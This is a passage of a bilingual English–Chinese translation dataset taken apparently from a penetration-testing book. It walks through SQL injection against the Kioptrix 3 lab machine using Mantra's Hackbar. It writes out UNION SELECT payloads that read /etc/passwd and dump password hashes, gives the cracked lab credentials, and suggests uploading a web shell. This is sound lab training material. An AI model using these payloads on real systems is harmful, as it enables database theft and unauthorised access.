- en: 'Now we are seeing something that is more interesting. Our SQL injection worked!
    Next we change the proof of concept code to read as follows and give it a try:'
  id: totrans-342
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们看到了更有趣的东西。我们的SQL注入成功了！接下来，我们将修改概念证明代码如下，并尝试一下：
- en: '[PRE48]'
  id: totrans-343
  prefs: []
  type: TYPE_PRE
  zh: '[PRE48]'
- en: This command results in providing us with the username of `admin` and the password
    of `n0t7t1k4`. Use this information to log into [http://kioptrix3.com/gallery/gadmin](http://kioptrix3.com/gallery/gadmin)
    and browse around a bit. You have admin access on the application but you did
    not get root access to the machine itself yet. Now that you know you can use SQL
    injection to get anything in the database start thinking of what else you may
    be able to get to; don't forget about our file inclusion vulnerability either!
    Our journey through Kioptrix level 3 is not yet complete.
  id: totrans-344
  prefs: []
  type: TYPE_NORMAL
- en: Introduction to Mantra
  id: totrans-345
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: The Mantra browser provides penetration testers with a myriad of tools that
    make web application testing efficient and fun. It takes advantage of many of
    the browser-based plugins that have been written over the years and is available
    at [http://getmantra.com](http://getmantra.com). Be sure to check out some of
    the well written and detailed tutorials made available at this site as they provide
    use case examples beyond the basics. We will use the plugins within Mantra to
    fully exploit the Kioptrix 3 machine in our lab in an efficient manner. The primary
    plugin we take advantage of in this example is the Hackbar. You can learn more
    about Hackbar at [https://addons.mozilla.org/en-US/firefox/addon/hackbar/](http://https://addons.mozilla.org/en-US/firefox/addon/hackbar/).
    The Hackbar and other add-ons in Mantra make testing web applications fun and
    allow a knowledgeable penetration tester to manually verify the security of a
    web application.
  id: totrans-346
  prefs: []
  type: TYPE_NORMAL
- en: Note
  id: totrans-347
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: You will still need to understand how web application security works and how
    to manually perform these tests; Mantra just makes the process more convenient
    and efficient by providing many of the tools needed for manual testing. Use the
    Mutillidae installation to fill any gaps you have in testing for common web application
    security issues.
  id: totrans-348
  prefs: []
  type: TYPE_NORMAL
- en: Our first step is to open up the Mantra browser on the BackTrack machine. Mantra
    can be found by choosing **BackTrack** | **Vulnerability Assessment** | **Vulnerability
    Scanners** | **Mantra** from the navigation menu.
  id: totrans-349
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: In Mantra, browse to the web page hosted on your Kioptrix 1.2 virtual server
    using the browser's URL navigation bar ([http://kioptrix3.com](http://kioptrix3.com)).
  id: totrans-350
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Using the hackbar in Mantra enter the following URL and click on the **Execute**
    button:'
  id: totrans-351
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE49]'
  id: totrans-352
  prefs: []
  type: TYPE_PRE
  zh: '[PRE49]'
- en: You should be presented with the username `admin` and the password `n0t7t1k4`.
  id: totrans-353
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Let''s take a look at how we can get other information. Enter the following
    into the hackbar: [http://kioptrix3.com/gallery/gallery.php?id=1](http://kioptrix3.com/gallery/gallery.php?id=1)
    and click on **Execute**.'
  id: totrans-354
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Now place the cursor at the end of the [http://kioptrix3.com/gallery/gallery.php?id=1](http://kioptrix3.com/gallery/gallery.php?id=1)
    entry in the hackbar, add a space and then directly above the hackbar click **SQL**
    | **Union Select Statement** and enter `6` in the pop up that appears, and click
    on **OK**. Click on the hackbar **Execute** button to verify that the SQL injection
    works.
  id: totrans-355
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Now replace the number `2` in the query that was generated by highlighting
    it and clicking on **SQL | MySQL | Basic Info Column** so that your URL now looks
    like this: [http://kioptrix3.com/gallery/gallery.php?id=1 UNION SELECT 1,CONCAT_WS(CHAR(32,58,32),user(),database(),@@version),3,4,5,6](http://kioptrix3.com/gallery/gallery.php?id=1%20UNION%20SELECT%201,CONCAT_WS(CHAR(32,58,32),user(),database(),@@version),3,4,5,6).
    Click on **Execute** on the hackbar and review the results. The output should
    contain the following information: `root@localhost : gallery : 5.0.51a-3ubuntu5.4`.
    You have successfully enumerated the user, database name, and version that is
    running.'
  id: totrans-356
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: At this point you can use any of the typical SQL injection tricks to enumerate
    this database. Try running different commands such as [http://kioptrix3.com/gallery/gallery.php?id=1
    UNION SELECT 1,table_name,3,4,5,6 from information_schema.tables where table_schema=database()](http://kioptrix3.com/gallery/gallery.php?id=1%20UNION%20SELECT%201,table_name,3,4,5,6%20from%20information_schema.tables%20where%20table_schema=database())
    which will list all of the tables from the current database.
  id: totrans-357
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 此时，您可以使用任何典型的SQL注入技巧来枚举这个数据库。尝试运行不同的命令，比如[http://kioptrix3.com/gallery/gallery.php?id=1
    UNION SELECT 1,table_name,3,4,5,6 from information_schema.tables where table_schema=database()](http://kioptrix3.com/gallery/gallery.php?id=1%20UNION%20SELECT%201,table_name,3,4,5,6%20from%20information_schema.tables%20where%20table_schema=database())，这将列出当前数据库中的所有表。
- en: We can already access certain files on the server using commonly used SQL injection
    code such as [http://kioptrix3.com/gallery/gallery.php?id=1 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5,6](http://kioptrix3.com/gallery/gallery.php?id=1%20UNION%20SELECT%201,LOAD_FILE('/etc/passwd'),3,4,5,6).
    This will list the passwd file from the server.
  id: totrans-358
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们已经可以使用常用的SQL注入代码访问服务器上的某些文件，比如[http://kioptrix3.com/gallery/gallery.php?id=1
    UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5,6](http://kioptrix3.com/gallery/gallery.php?id=1%20UNION%20SELECT%201,LOAD_FILE('/etc/passwd'),3,4,5,6)。这将列出服务器上的passwd文件。
- en: 'To pull the development user''s account information we can use [http://kioptrix3.com/gallery/gallery.php?id=1
    UNION SELECT 1,username,password,4,5,6 from dev_accounts](http://kioptrix3.com/gallery/gallery.php?id=1%20UNION%20SELECT%201,username,password,4,5,6%20from%20dev_accounts)
    which provides us with the information for the username `loneferret` with a password
    hash value of `5badcaf789d3d1d09794d8f021f40f0e` and the user `dreg` with a password
    hash of `0d3eccfb887aabd50f243b3f155c0f85`. We can try to crack these user passwords.
    Successfully cracking the passwords will provide you with the following credentials:
    `dreg` - `Mast3r` and `loneferret` - `starwars`.'
  id: totrans-359
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 为了获取开发用户的帐户信息，我们可以使用[http://kioptrix3.com/gallery/gallery.php?id=1 UNION SELECT
    1,username,password,4,5,6 from dev_accounts](http://kioptrix3.com/gallery/gallery.php?id=1%20UNION%20SELECT%201,username,password,4,5,6%20from%20dev_accounts)，这为我们提供了用户名`loneferret`的信息，密码哈希值为`5badcaf789d3d1d09794d8f021f40f0e`，以及用户`dreg`的密码哈希值为`0d3eccfb887aabd50f243b3f155c0f85`。我们可以尝试破解这些用户密码。成功破解密码将为您提供以下凭据：`dreg`
    - `Mast3r`和`loneferret` - `starwars`。
- en: These users have fallen into the pitfall of reusing passwords. You can log onto
    the Kioptrix 1.2 machine on your lab now by opening up an SSH session from your
    BackTrack to the Kioptrix machine. Luckily, these accounts are not in the sudoers
    list. Now we need to elevate the privilege of one of the accounts.
  id: totrans-360
  prefs: []
  type: TYPE_NORMAL
  zh: 这些用户陷入了重复使用密码的陷阱。您现在可以通过从BackTrack到Kioptrix机器打开SSH会话来登录您的实验室中的Kioptrix 1.2机器。幸运的是，这些帐户不在sudoers列表中。现在我们需要提升其中一个帐户的权限。
- en: Note
  id: totrans-361
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: At this point you are almost at root on the Kioptrix Level 1.2 machine. Take
    your time and look around the server and try to figure out a method of escalating
    the privilege of either user.
  id: totrans-362
  prefs: []
  type: TYPE_NORMAL
  zh: 此时，您几乎已经获得了Kioptrix Level 1.2机器的root权限。花点时间四处看看服务器，尝试找出提升用户权限的方法。
- en: Once you have gained root using SSH, challenge yourself again by uploading a
    shell to the Kioptrix Level 1.2 machine using nothing but the website! There are
    several different methods of accomplishing this, if you get stuck take a look
    at one of the many walkthroughs on the Web.
  id: totrans-363
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦您使用SSH获得了root权限，通过网站上传一个shell到Kioptrix Level 1.2机器，再次挑战自己！有几种不同的方法可以实现这一点，如果遇到困难，可以参考网络上的许多攻略。
- en: Summary
  id: totrans-364
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 摘要
- en: We have had a chance to really start building out our test environment, setting
    up tools such as Kioptrix, pfSense, Muttilidae, HAProxy, and more. Using these
    tools in our lab helps us to better understand the technology that we are testing.
    The best penetration testers have significant IT experience so that they are able
    to leverage both when testing and when explaining the concepts and mitigating
    controls to their clients.
  id: totrans-365
  prefs: []
  type: TYPE_NORMAL
  zh: 我们有机会真正开始构建我们的测试环境，设置Kioptrix、pfSense、Muttilidae、HAProxy等工具。在我们的实验室中使用这些工具有助于我们更好地理解我们正在测试的技术。最好的渗透测试人员具有丰富的IT经验，这样他们在测试和解释概念以及向客户解释控制措施时都能够充分利用。
- en: We have also learned how to use tools such as `lbd` to determine if a system
    is being load balanced and Wafw00f to look for web application firewalls. Practice
    makes perfect, and with that in mind each and every step was defined in such a
    way that you could follow along and gain confidence with the technology, or just
    simply refresh your already significant skill set. After all, with so much to
    remember in the security field it is easy to fall out of practice.
  id: totrans-366
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还学会了如何使用工具如`lbd`来确定系统是否正在进行负载平衡，以及使用Wafw00f来寻找Web应用程序防火墙。熟能生巧，考虑到这一点，每一步都被定义得可以让您跟随并对技术充满信心，或者只是简单地更新您已经具有的重要技能。毕竟，在安全领域有很多需要记住的东西，很容易失去实践。
- en: We walked through using the w3af graphical user interface and then followed
    up with my favorite, which is the w3af console that can be scripted if you want
    to be even more efficient. Using Kioptrix 1.2 we were able to step through the
    different steps that might be taken if you were trying to penetrate a large web
    application for a client. We discussed that sometimes automated tools are just
    not sufficient to find the exploits, and thus a browser and HTTP proxy such as
    WebScarab can make the difference between a good and a bad penetration test. We
    also introduced you to Mantra which will make your web application testing more
    efficient by providing many of the plugins that have been created by the community
    to help security professionals perform their job.
  id: totrans-367
  prefs: []
  type: TYPE_NORMAL
  zh: 我们使用了w3af图形用户界面，然后使用了我最喜欢的w3af控制台，如果您想要更高效，可以对其进行脚本化。使用Kioptrix 1.2，我们能够逐步了解如果您试图渗透客户的大型Web应用程序可能采取的不同步骤。我们讨论了有时自动化工具并不足以找到漏洞，因此浏览器和WebScarab等HTTP代理可以决定一个渗透测试的好坏。我们还向您介绍了Mantra，它将通过提供社区创建的许多插件来帮助安全专业人员执行工作，从而使您的Web应用程序测试更加高效。
- en: One last thing that we learned is that web application testing is a complex
    and difficult art to master. If you run into problems, never give up and just
    keep trying!
  id: totrans-368
  prefs: []
  type: TYPE_NORMAL
  zh: 我们学到的最后一件事是，Web应用程序测试是一门复杂而艰难的艺术。如果你遇到问题，永远不要放弃，继续努力！
- en: The next chapter dives into exploitation and client-side attacks. We learn about
    buffer overflows and even create our own vulnerable program. We also discuss different
    fuzzers such as BED and sfuzz. We dive into Fast-Track and how it can be used
    to set up a mass web attack. We also touch upon Antivirus avoidance and repackaging
    payloads. Best of all we discuss the Social Engineering Toolkit, which should
    be an invaluable addition to every pentester's toolbox.
  id: totrans-369
  prefs: []
  type: TYPE_NORMAL
  zh: 下一章将深入探讨利用和客户端攻击。我们将学习缓冲区溢出，甚至创建我们自己的易受攻击程序。我们还讨论了不同的模糊测试工具，如BED和sfuzz。我们深入研究了Fast-Track以及如何用它来设置大规模的网络攻击。我们还涉及了防病毒软件的规避和重新打包载荷。最重要的是，我们讨论了社会工程工具包，这应该是每个渗透测试人员工具箱中不可或缺的部分。
